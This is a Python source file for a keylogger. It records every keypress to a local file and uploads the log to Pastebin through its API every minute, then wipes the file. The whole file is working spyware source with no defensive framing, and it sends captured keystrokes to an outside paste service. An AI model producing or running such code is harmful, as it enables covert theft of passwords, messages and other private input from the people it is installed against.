import os
import pyperclip
import threading
import requests
import time
import keyboard

# Set the API key and the URL for the Pastebin API
api_key = "YOUR_PASTEBIN_API_KEY_HERE"
api_url = "https://pastebin.com/api/api_post.php"

# Set the file path for the log file
log_file = "keylogs.txt"

# Set the interval for uploading logs to Pastebin
upload_interval = 60  # Upload logs every 60 seconds

# Function to upload logs to Pastebin
def upload_logs():
    # Read the contents of the log file
    with open(log_file, "r") as f:
        log_content = f.read()

    # Set the parameters for the Pastebin API
    data = {
        "api_dev_key": api_key,
        "api_option": "paste",
        "api_paste_code": log_content,
        "api_paste_name": "Keylogger Logs",
        "api_paste_expire_date": "1D",
    }

    # Make the request to the Pastebin API
    response = requests.post(api_url, data=data)

    # Print the response from the Pastebin API
    print(response.text)

    # Clear the contents of the log file
    open(log_file, "w").close()

    # Schedule the next upload
    threading.Timer(upload_interval, upload_logs).start()

# Start uploading logs to Pastebin
upload_logs()

# Function to log keystrokes to a file
def log_keystroke(key):
    # Write the keystroke to the log file
    with open(log_file, "a") as f:
        f.write(key.name)

# Start the keylogger
keyboard.on_press(log_keystroke)

# Keep the program running
while True:
    time.sleep(1)
